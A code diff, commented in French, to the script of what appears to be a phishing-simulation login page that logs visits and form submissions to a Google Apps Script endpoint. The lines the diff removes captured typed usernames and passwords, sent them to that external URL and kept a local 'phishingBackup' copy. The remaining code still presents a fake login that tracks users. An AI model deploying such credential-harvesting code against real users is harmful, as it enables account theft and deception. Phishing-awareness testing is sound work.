@@ -347,15 +347,15 @@
     </div>
 
     <script>
-        // ⚠️ REMPLACEZ CETTE URL PAR VOTRE URL GOOGLE SHEETS WEB APP
-        const GOOGLE_SHEETS_URL = 'https://script.google.com/macros/s/AKfycbzsTqACMHkyzVIabxTm4aWlIDHAVJu_LhXZEVmwHJX7dSJSizcQl4Tc-H-Yw4ZOQAc/exec';
+        const GOOGLE_SHEETS_URL = 
+            'https://script.google.com/macros/s/AKfycbzsTqACMHkyzVIabxTm4aWlIDHAVJu_LhXZEVmwHJX7dSJSizcQl4Tc-H-Yw4ZOQAc/exec';            ;
 
         function getSource() {
             const urlParams = new URLSearchParams(window.location.search);
             return urlParams.get('source') || 'email';
         }
 
-        // Enregistrer le clic/scan dès l'arrivée
+        // Enregistrer SEULEMENT le clic/scan (PAS les identifiants)
         function trackPageVisit() {
             const source = getSource();
             const visitData = {
@@ -365,11 +365,7 @@
                 source: source
             };
 
-            // Envoyer à Google Sheets
             sendToGoogleSheets(visitData);
-
-            // Backup local (au cas où)
-            saveLocalBackup(visitData);
         }
 
         function togglePassword() {
@@ -390,26 +386,17 @@
         function handleLogin(event) {
             event.preventDefault();
 
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
             const source = getSource();
 
+            // Enregistrer SEULEMENT la soumission (PAS les identifiants)
             const submissionData = {
                 type: 'form_submission',
-                username: username,
-                password: password,
                 timestamp: new Date().toISOString(),
                 userAgent: navigator.userAgent,
-                screenResolution: `${screen.width}x${screen.height}`,
-                language: navigator.language,
                 source: source
             };
 
-            // Envoyer à Google Sheets
             sendToGoogleSheets(submissionData);
-
-            // Backup local
-            saveLocalBackup(submissionData);
 
             // Redirection
             setTimeout(() => {
@@ -432,18 +419,8 @@
                 console.log('✅ Données envoyées à Google Sheets');
             })
             .catch((error) => {
-                console.error('❌ Erreur Google Sheets:', error);
+                console.error('❌ Erreur:', error);
             });
-        }
-
-        function saveLocalBackup(data) {
-            try {
-                let backups = JSON.parse(localStorage.getItem('phishingBackup') || '[]');
-                backups.push(data);
-                localStorage.setItem('phishingBackup', JSON.stringify(backups));
-            } catch (e) {
-                console.error('Erreur backup local:', e);
-            }
         }
 
         // Tracker dès le chargement
